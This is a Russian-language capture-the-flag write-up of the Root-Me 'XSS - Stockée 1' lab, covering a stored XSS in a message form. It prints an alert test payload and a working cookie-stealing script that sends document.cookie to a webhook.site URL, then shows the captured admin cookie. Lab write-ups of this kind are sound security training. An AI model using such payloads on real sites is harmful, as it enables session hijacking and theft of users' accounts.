---
title: '[WEB] "XSS - Stockée 1"'
date: 2025-12-03T03:15:00+03:00
categories:
  - Lab
tags:
  - web
  - xss
excerpt: " "
header:
  overlay_image: https://apprendre-avec-le-jeu.com/wp-content/uploads/2024/03/Root-me-Logo.png
  overlay_filter: 0.4
  actions:
    - label: "Lab Root-Me"
      url: "https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-1"
---

**Украдите файл cookie сеанса администратора и используйте его для проверки события.**  

При заходе на сайт, мы получаем такую форму  
<img width="1919" height="993" alt="image" src="https://github.com/user-attachments/assets/6006305e-4333-459d-aee8-38e897d43f81" />  
Так как в задании сказано про xss попробуем вызвать alert. Message:  
```js
<script>alert(123);</script>
```  
<img width="1919" height="992" alt="image" src="https://github.com/user-attachments/assets/2a3b1fca-2bdb-4bc0-a030-4e0f8cfa000d" />  
Отлично! Мы имеем xss уязвимость. Так как у нас задание перехватить cookie админа, попробуем получить его с помощью скрипта, перенаправляющего пользователя на наш сайт, в url которого будут передаваться cookie пользователя, в надежде, что админ зайдет на него.  
Для этого получим ссылку на наш сайт через https://webhook.site/ и напишем небольшой скрипт  

```js
<script>document.write('<img src="http://webhook.site/YOUR-UNIQUE-ID?cmd=' + document.cookie + '" width=0 height=0 border=0 />');</script>
```

После подстановки 'YOUR-UNIQUE-ID' отправляю payload в поле _message_.  
Администратор зашел на сайт и мы получили его cookie!
<img width="793" height="76" alt="image" src="https://github.com/user-attachments/assets/ae74d2fa-d1bc-46dd-95d0-cab629a3bf9b" />  
```ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6```  
